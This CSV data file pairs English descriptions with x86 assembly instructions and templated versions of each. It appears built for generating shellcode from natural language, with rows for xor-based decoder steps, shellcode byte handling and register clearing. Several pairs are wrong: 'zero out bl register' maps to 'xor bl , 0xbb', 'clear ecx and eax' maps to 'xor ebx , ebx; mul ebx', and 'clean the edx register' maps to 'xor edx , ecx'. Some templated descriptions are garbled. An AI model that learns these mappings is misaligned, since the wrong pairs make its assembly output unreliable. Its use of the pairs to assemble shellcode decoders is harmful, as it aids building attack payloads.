swap the contents of the eax register with the contents of the esi register,swap contents var0 register contents var1 register,"xchg eax , esi","xchg var0 , var1"
swap the contents of the ebx register with the contents of the eax register,swap contents var0 register contents var1 register,"xchg ebx , eax","xchg var0 , var1"
swap the values of ebx and eax,swap values var0 and var1,"xchg ebx , eax","xchg var0 , var1"
swap the values of ebx and eax registers,swap values var0 and var1 registers,"xchg ebx , eax","xchg var0 , var1"
exchange the contents of the ebx register with the contents of the eax register,exchange contents var0 register contents var1 register,"xchg ebx , eax","xchg var0 , var1"
exchange ebx with ecx,exchange var0 var1,"xchg ebx , ecx","xchg var0 , var1"
swap the contents of the ebx register with the contents of the edx register,swap contents var0 register contents var1 register,"xchg ebx , edx","xchg var0 , var1"
swap the contents of the ebx register with the contents of the esp register,swap contents var0 register contents esp register,"xchg ebx , esp","xchg var0 , esp"
swap the values of ebx and esp registers,swap values var0 and esp registers,"xchg ebx , esp","xchg var0 , esp"
exchange ecx with edx,exchange var0 var1,"xchg ecx , edx","xchg var0 , var1"
swap the contents of the ecx register with the contents of the edx register,swap contents var0 register contents var1 register,"xchg ecx , edx","xchg var0 , var1"
swap the contents of the edi register with the contents of the eax register,swap contents var0 register contents var1 register,"xchg edi , eax","xchg var0 , var1"
swap the values of edi and eax registers,swap values var0 and var1 registers,"xchg edi , eax","xchg var0 , var1"
swap the values of edx and eax registers,swap values var0 and var1 registers,"xchg edx , eax","xchg var0 , var1"
exchange edx with eax,exchange var0 var1,"xchg edx , eax","xchg var0 , var1"
swap the values of edx and ebx registers,swap values var0 and var1 registers,"xchg edx , ebx","xchg var0 , var1"
swap the contents of the esi register with the contents of the eax register,swap contents var0 register contents var1 register,"xchg esi , eax","xchg var0 , var1"
swap the values of esi and eax,swap values var0 and var1,"xchg esi , eax","xchg var0 , var1"
swap the values of esi and ebx,swap values var0 and var1,"xchg esi , ebx","xchg var0 , var1"
swap the values of esp and esi registers,swap values esp and var0 registers,"xchg esp , esi","xchg esp , var0"
swap the values si ebx and bx registers,swap values si var0 and var1 registers,"xchg si , bx","xchg si , var1"
perform xor operation between ebx register and the word __flag_byte and save the result in ebx,perform xor operation var0 register and word var2 and save result var0,"xor [ebx] , word __flag_byte","xor [var0] , word var2"
perform xor operation between the value stored at the location ecx+116 and bh,perform xor operation value stored location var0 and bh,"xor [ecx+116] , bh","xor [var0] , bh"
perform a logical xor between the address specified by [ecx + 116] and the bh register and save the result in [ecx + 116],perform a logical xor between the address specified by [ecx + 116] and the bh register and save the result in [ecx + 116],"xor [ecx+116] , bh","xor [ecx+116] , bh"
perform xor operation between the value stored at the location ecx+116 and dh,perform xor operation value stored location var0 and var1,"xor [ecx+116] , dh","xor [var0] , var1"
perform a logical xor between the address specified by [ecx + 116] and the dh register and save the result in [ecx + 116],perform a logical xor between the address specified by [ecx + 116] and the dh register and save the result in [ecx + 116],"xor [ecx+116] , dh","xor [ecx+116] , dh"
perform the xor operation between the value stored at the location ecx and bh,perform xor operation value stored location var0 and bh,"xor [ecx] , bh","xor [var0] , bh"
perform the xor operation between the value stored at the location ecx and dh,perform xor operation value stored location var0 and var1,"xor [ecx] , dh","xor [var0] , var1"
zero out ah register,zero out var0 register,"xor ah , ah","xor var0 , var0"
clear the ah register,clear var0 register,"xor ah , ah","xor var0 , var0"
perform a logical xor between the al register and 0e9h and save the result in al,perform logical xor al register and var0 and save result al,"xor al , 0e9h","xor al , var0"
perform the xor operation between the al register and the value 0x30,perform xor operation al register and value var0,"xor al , 0x30","xor al , var0"
perform the xor operation between the al register and the value 0x41,perform xor operation al register and value var0,"xor al , 0x41","xor al , var0"
perform the xor operation between the ax register and the value 0x3041,perform xor operation ax register and value var0,"xor ax , 0x3041","xor ax , var0"
perform the xor operation between the ax register and the value 0x4f73,perform xor operation ax register and value var0,"xor ax , 0x4f73","xor ax , var0"
jump to the decoded_shellcode label if the result of the logical xor between the ax register and the value 0x539 is zero,jump var0 label if result logical xor ax register and value var1 zero,"xor ax , 0x539 \n jz decoded_shellcode","xor ax , var1 \n jz var0"
perform the xor operation between the contents of the ax register and the value 0x7777,perform xor operation contents ax register and value var0,"xor ax , 0x7777","xor ax , var0"
clear the ax register,clear ax register,"xor ax , ax","xor ax , ax"
zero out ax register,zero out ax register,"xor ax , ax","xor ax , ax"
perform a logical xor between the bl register and 0xbb and save the result in bl,perform logical xor var0 register and var2 and save result var0,"xor bl , 0xbb","xor var0 , var2"
zero out bl register,zero out var0 register,"xor bl , 0xbb","xor var0 , 0xbb"
zero out bx register,zero out var0 register,"xor bx , bx","xor var0 , var0"
perform a logical xor between the byte at the address specified by [esi + ecx - 1] and the bh register and save the result in [esi + ecx - 1],perform a logical xor between the byte at the address specified by [esi + ecx - 1] and the bh register and save the result in [esi + ecx - 1],"xor byte [esi+ecx - 1] , 0x3","xor byte [esi+ecx - 1] , 0x3"
perform a logical xor between the byte at the address specified by [esi] and the cl register and save the result in [esi],perform a logical xor between the byte at the address specified by [esi] and the cl register and save the result in [esi],"xor byte [esi] , cl","xor byte [esi] , cl"
jump short to the EncodedShellcode label if the result of the logical xor between the cl register and the value 0x32 is zero,jump short var0 label if result logical xor cl register and value var1 zero,"xor cl , 0x32 \n jz short EncodedShellcode","xor cl , var1 \n jz short var0"
perform a logical xor between the cl register and 0xaa and save the result in cl,perform logical xor cl register and var0 and save result cl,"xor cl , 0xaa","xor cl , var0"
perform the xor operation between cl and 0xaa and store the result in cl,perform xor operation cl and var0 and store result cl,"xor cl , 0xaa","xor cl , var0"
perform a logical xor between the dl register and 0xbb and save the result in dl,perform logical xor dl register and var0 and save result dl,"xor dl , 0xbb","xor dl , var0"
perform the xor operation between dl and 0xbb and store the result in dl,perform xor operation dl and var0 and store result dl,"xor dl , 0xbb","xor dl , var0"
perform the xor operation between eax register and edi register and store the result in eax,perform xor operation var0 register and var2 register and store result var0,"xor eax , [edi]","xor var0 , [var2]"
perform xor operation between eax register and esi register and store the result in eax,perform xor operation var0 register and var2 register and store result var0,"xor eax , [esi]","xor var0 , [var2]"
perform the xor operation between eax and 0x58494741 value and store the result in eax,perform xor operation var0 and var2 value and store result var0,"xor eax , 0x58494741","xor var0 , var2"
perform a logical xor between the eax register and 0x58494741 and save the result in eax,perform logical xor var0 register and var2 and save result var0,"xor eax , 0x58494741","xor var0 , var2"
perform the xor operation between the eax register and the value 0x6e696230,perform xor operation var0 register and value var1,"xor eax , 0x6e696230","xor var0 , var1"
perform a logical xor operation between eax and 0x7575,perform logical xor operation var0 and var1,"xor eax , 0x7575","xor var0 , var1"
perform a logical xor between the eax register and 0xffffffff and save the result in eax,perform logical xor var0 register and var2 and save result var0,"xor eax , 0xffffffff","xor var0 , var2"
initialize eax with decimal value 0,initialize var0 decimal value 0,"xor eax , eax","xor var0 , var0"
perform xor operation between eax and eax,perform xor operation var0 and var0,"xor eax , eax","xor var0 , var0"
reset both lower and uppper bytes of eax to be 0,reset both lower and var0 bytes var1 be 0,"xor eax , eax","xor var1 , var1"
reset eax,reset var0,"xor eax , eax","xor var0 , var0"
set the eax register to null,set var0 register null,"xor eax , eax","xor var0 , var0"
zero out eax,zero out var0,"xor eax , eax","xor var0 , var0"
zero out the eax register,zero out var0 register,"xor eax , eax","xor var0 , var0"
init eax 0,var0 var1 0,"xor eax , eax","xor var1 , var1"
set eax to 0,set var0 0,"xor eax , eax","xor var0 , var0"
zero out the eax register and jump to the l3 label if the contents of the edx register is equal to the contents of the eax register,zero out var0 register and jump var2 label if contents var3 register equal contents var0 register,"xor eax , eax \n cmp edx , eax \n je l3","xor var0 , var0 \n cmp var3 , var0 \n je var2"
zero out the eax register and jump to the l3 label if the contents of the edx register is not equal to the contents of the eax register,zero out var0 register and jump var2 label if contents var3 register not equal contents var0 register,"xor eax , eax \n cmp edx , eax \n jne l3","xor var0 , var0 \n cmp var3 , var0 \n jne var2"
clean the eax register and move the next byte of the shellcode into the lower byte of the register,clean var0 register and move next byte shellcode lower byte register,"xor eax , eax \n mov al , [esi+1]","xor var0 , var0 \n mov al , [esi+1]"
zero out eax and move 0x3 in the lowest byte of the register,zero out var0 and move var1 lowest byte register,"xor eax , eax \n mov al , 0x3","xor var0 , var0 \n mov al , var1"
clear eax and move 0x4 in the lowest byte of the register,clear var0 and move var1 lowest byte register,"xor eax , eax \n mov al , 0x4","xor var0 , var0 \n mov al , var1"
clean the eax register and move 5 in the lowest byte of the register,clean var0 register and move 5 lowest byte register,"xor eax , eax \n mov al , 5","xor var0 , var0 \n mov al , 5"
push zero onto the stack,push zero stack,"xor eax , eax \n push eax","xor eax , eax \n push eax"
zero out the eax register and push zero onto the stack,zero out var0 register and push zero stack,"xor eax , eax \n push eax","xor var0 , var0 \n push var0"
"clean eax, ebx, ecx and edx",clean var0 var1 var2 and var3,"xor eax , eax \n xor ebx , ebx \n xor ecx , ecx \n xor edx , edx","xor var0 , var0 \n xor var1 , var1 \n xor var2 , var2 \n xor var3 , var3"
"zero out eax, ebx, ecx and edx registers",zero out var0 var1 var2 and var3 registers,"xor eax , eax \n xor ebx , ebx \n xor ecx , ecx \n xor edx , edx","xor var0 , var0 \n xor var1 , var1 \n xor var2 , var2 \n xor var3 , var3"
"clear eax, ebx and edx",clear var0 var1 and var2,"xor eax , eax \n xor ebx , ebx \n xor edx , edx","xor var0 , var0 \n xor var1 , var1 \n xor var2 , var2"
perform a logical xor between the eax register and the ebx register and save the result in eax,perform logical xor var0 register and var2 register and save result var0,"xor eax , ebx","xor var0 , var2"
perform xor operation between eax register and ebx register and store the result in eax,perform xor operation var0 register and var2 register and store result var0,"xor eax , ebx","xor var0 , var2"
perform a logical xor between the eax register and the edi register and save the result in eax,perform logical xor var0 register and var2 register and save result var0,"xor eax , edi","xor var0 , var2"
perform a logical xor between the eax register and the esi register and save the result in eax,perform logical xor var0 register and var2 register and save result var0,"xor eax , esi","xor var0 , var2"
perform a logical xor between the ebx register and the ebp register and save the result in ebx,perform logical xor var0 register and var2 register and save result var0,"xor ebx , ebp","xor var0 , var2"
initialize ebx with 0,initialize var0 0,"xor ebx , ebx","xor var0 , var0"
reset both lower and uppper bytes of ebx to be 0,reset both lower and var0 bytes var1 be 0,"xor ebx , ebx","xor var1 , var1"
zero out ebx,zero out var0,"xor ebx , ebx","xor var0 , var0"
clear the ebx register,clear var0 register,"xor ebx , ebx","xor var0 , var0"
init ebx 0,var0 var1 0,"xor ebx , ebx","xor var1 , var1"
reset ebx to 0,reset var0 0,"xor ebx , ebx","xor var0 , var0"
set the ebx register to null,set var0 register null,"xor ebx , ebx","xor var0 , var0"
zero out the ebx register and jump to the exit label if the contents of the eax register is equal to the contents of the ebx register,zero out var0 register and jump exit label if contents var2 register equal contents var0 register,"xor ebx , ebx \n cmp eax , ebx \n je exit","xor var0 , var0 \n cmp var2 , var0 \n je exit"
clean the ebx register and move the next byte of the shellcode into the lower byte of the register,clean var0 register and move next byte shellcode lower byte register,"xor ebx , ebx \n mov bl , [esi+1]","xor var0 , var0 \n mov bl , [esi+1]"
clear the ebx register and move the next byte of the shellcode into the lower byte of the register,clear var0 register and move next byte shellcode lower byte register,"xor ebx , ebx \n mov bl , [esi+1]","xor var0 , var0 \n mov bl , [esi+1]"
zero out ebx and move 0x3 in the lowest byte of the register,zero out var0 and move var1 lowest byte register,"xor ebx , ebx \n mov bl , 0x3","xor var0 , var0 \n mov bl , var1"
clear the ebx register and move 2 in the lowest byte of the register,clear var0 register and move 2 lowest byte register,"xor ebx , ebx \n mov bl , 2","xor var0 , var0 \n mov bl , 2"
clean the ebx register and move 5 in the lowest byte of the register,clean var0 register and move 5 lowest byte register,"xor ebx , ebx \n mov bl , 5","xor var0 , var0 \n mov bl , 5"
zero out the eax and ebx register,zero out var0 and var1 register,"xor ebx , ebx \n mul ebx","xor var1 , var1 \n mul var1"
zero out the eax register and the ebx register,zero out var0 register and var1 register,"xor ebx , ebx \n mul ebx","xor var1 , var1 \n mul var1"
clear ecx and eax,clear var0 and var1,"xor ebx , ebx \n mul ebx","xor ebx , ebx \n mul ebx"
"zero out ecx, edx and eax",zero out var0 var1 and var2,"xor ebx , ebx \n mul ebx","xor ebx , ebx \n mul ebx"
clean eax and edx,clean var0 and var1,"xor ebx , ebx \n mul ebx","xor ebx , ebx \n mul ebx"
zero out eax and edx,zero out var0 and var1,"xor ebx , ebx \n mul ebx","xor ebx , ebx \n mul ebx"
push zero onto the stack,push zero stack,"xor ebx , ebx \n push ebx","xor ebx , ebx \n push ebx"
clear the ebx register and push its contents onto the stack,clear var0 register and push its contents stack,"xor ebx , ebx \n push ebx","xor var0 , var0 \n push var0"
zero out ebx and edx,zero out var0 and var1,"xor ebx , ebx \n xor edx , edx","xor var0 , var0 \n xor var1 , var1"
perform a logical xor between the ebx register and the word __flag_byte and save the result in ebx,perform logical xor var0 register and word var2 and save result var0,"xor ebx , word __flag_byte","xor var0 , word var2"
perform a logical xor between the ecx register and the dh register and save the result in ecx,perform logical xor var0 register and var2 register and save result var0,"xor ecx , dh","xor var0 , var2"
initialize ecx to zero,initialize var0 zero,"xor ecx , ecx","xor var0 , var0"
initialize ecx with decimal value 0,initialize var0 decimal value 0,"xor ecx , ecx","xor var0 , var0"
reset both lower and uppper bytes of ecx to be 0,reset both lower and var0 bytes var1 be 0,"xor ecx , ecx","xor var1 , var1"
set the ecx register to null,set var0 register null,"xor ecx , ecx","xor var0 , var0"
zero out the ecx register,zero out var0 register,"xor ecx , ecx","xor var0 , var0"
zero out ecx,zero out var0,"xor ecx , ecx","xor var0 , var0"
reset ecx to 0,reset var0 0,"xor ecx , ecx","xor var0 , var0"
clear the ecx register,clear var0 register,"xor ecx , ecx","xor var0 , var0"
zero out the ecx register and jump to the l1 label if the contents of the ebx register is equal to the contents of the ecx register,zero out var0 register and jump var2 label if contents var3 register equal contents var0 register,"xor ecx , ecx \n cmp ebx , ecx \n je l1","xor var0 , var0 \n cmp var3 , var0 \n je var2"
clean the ecx register and move the next byte of the shellcode into the lower byte of the register,clean var0 register and move next byte shellcode lower byte register,"xor ecx , ecx \n mov cl , [esi+1]","xor var0 , var0 \n mov cl , [esi+1]"
clear the ecx register and move the next byte of the shellcode into the lower byte of the register,clear var0 register and move next byte shellcode lower byte register,"xor ecx , ecx \n mov cl , [esi+1]","xor var0 , var0 \n mov cl , [esi+1]"
clear ecx and move 0x4 in the lowest byte of the register,clear var0 and move var1 lowest byte register,"xor ecx , ecx \n mov cl , 0x4","xor var0 , var0 \n mov cl , var1"
zero out eax and ecx,zero out var0 and var1,"xor ecx , ecx \n mul ecx","xor var1 , var1 \n mul var1"
"zero out ecx, edx and eax",zero out var0 var1 and var2,"xor ecx , ecx \n mul ecx","xor var0 , var0 \n mul var0"
clean eax and edx,clean var0 and var1,"xor ecx , ecx \n mul ecx","xor ecx , ecx \n mul ecx"
zero out eax and edx,zero out var0 and var1,"xor ecx , ecx \n mul ecx","xor ecx , ecx \n mul ecx"
push zero onto the stack,push zero stack,"xor ecx , ecx \n push ecx","xor ecx , ecx \n push ecx"
clear the ecx register and push its contents onto the stack,clear var0 register and push its contents stack,"xor ecx , ecx \n push ecx","xor var0 , var0 \n push var0"
zero out the ecx register and push zero onto the stack,zero out var0 register and push zero stack,"xor ecx , ecx \n push ecx","xor var0 , var0 \n push var0"
initialize edi with 0,initialize var0 0,"xor edi , edi","xor var0 , var0"
clear the edi register,clear var0 register,"xor edi , edi","xor var0 , var0"
clean the edx register and move the next byte of the shellcode into the lower byte of the register,clean var0 register and move next byte shellcode lower byte register,"xor edx , ecx \n mov dl , [esi+1]","xor var0 , ecx \n mov dl , [esi+1]"
clear the edx register and move the next byte of the shellcode into the lower byte of the register,clear var0 register and move next byte shellcode lower byte register,"xor edx , ecx \n mov dl , [esi+1]","xor var0 , ecx \n mov dl , [esi+1]"
initialize edx with the decimal value 0,initialize var0 decimal value 0,"xor edx , edx","xor var0 , var0"
initialize edx with the hexadecimal value 0x0,initialize var0 hexadecimal value var1,"xor edx , edx","xor var0 , var0"
clear the edx register,clear var0 register,"xor edx , edx","xor var0 , var0"
set the contents of edx to zero,set contents var0 zero,"xor edx , edx","xor var0 , var0"
set the edx register to null,set var0 register null,"xor edx , edx","xor var0 , var0"
zero out edx,zero out var0,"xor edx , edx","xor var0 , var0"
zero out the edx register,zero out var0 register,"xor edx , edx","xor var0 , var0"
clear edx register,clear var0 register,"xor edx , edx","xor var0 , var0"
reset edx to 0,reset var0 0,"xor edx , edx","xor var0 , var0"
clear edx,clear var0,"xor edx , edx","xor var0 , var0"
zero out the edx register and jump to the l2 label if the contents of the ecx register is equal to the contents of the edx register,zero out var0 register and jump var2 label if contents var3 register equal contents var0 register,"xor edx , edx \n cmp ecx , edx \n je l2","xor var0 , var0 \n cmp var3 , var0 \n je var2"
zero out edx and move 0x3 in the lowest byte of the register,zero out var0 and move var1 lowest byte register,"xor edx , edx \n mov dl , 0x3","xor var0 , var0 \n mov dl , var1"
clear edx and move 0x4 in the lowest byte of the register,clear var0 and move var1 lowest byte register,"xor edx , edx \n mov dl , 0x4","xor var0 , var0 \n mov dl , var1"
clear the edx register and move 2 in the lowest byte of the register,clear var0 register and move 2 lowest byte register,"xor edx , edx \n mov dl , 2","xor var0 , var0 \n mov dl , 2"
zero out eax and edx,zero out var0 and var1,"xor edx , edx \n mul edx","xor var1 , var1 \n mul var1"
zero out the eax and edx register,zero out var0 and var1 register,"xor edx , edx \n mul edx","xor var1 , var1 \n mul var1"
zero out the edx register and push zero onto the stack,zero out var0 register and push zero stack,"xor edx , edx \n push edx","xor var0 , var0 \n push var0"
push zero onto the stack,push zero stack,"xor edx , edx \n push edx","xor edx , edx \n push edx"
clear the edx register and push its contents onto the stack,clear var0 register and push its contents stack,"xor edx , edx \n push edx","xor var0 , var0 \n push var0"
initialize the esi register with the decimal value 0,initialize var0 register decimal value 0,"xor esi , esi","xor var0 , var0"
init the esi register to 0,var0 var1 register 0,"xor esi , esi","xor var1 , var1"
clear the esi register,clear var0 register,"xor esi , esi","xor var0 , var0"
clear zero_reg,clear var0,"xor zero_reg , zero_reg","xor var0 , var0"
declare a doubleword at address y initialized to contain 3000,declare doubleword address y initialized contain 3000,y dd 3000,y dd 3000
create the doubleword variable y in memory and initialize it to zero,create doubleword variable y memory and initialize it zero,y : dd 0x0,y : dd 0x0
reserve one word for ymmval,reserve one word var0 var1,ymmval : resw 1,var1 : resw 1
declare three doubleword values initialized to 1 2 and 3 at address z,declare three doubleword values initialized 1 2 and 3 address z,"z dd 1 , 2 , 3","z dd 1 , 2 , 3"
declare three doublewords of memory starting at address z and initialized to 1 2 and 3,declare three var0 memory starting address z and initialized 1 2 and 3,"z dd 1 , 2 , 3","z dd 1 , 2 , 3"
create the doubleword variable z in memory and initialize it to zero,create doubleword variable z memory and initialize it zero,z : dd 0x0,z : dd 0x0
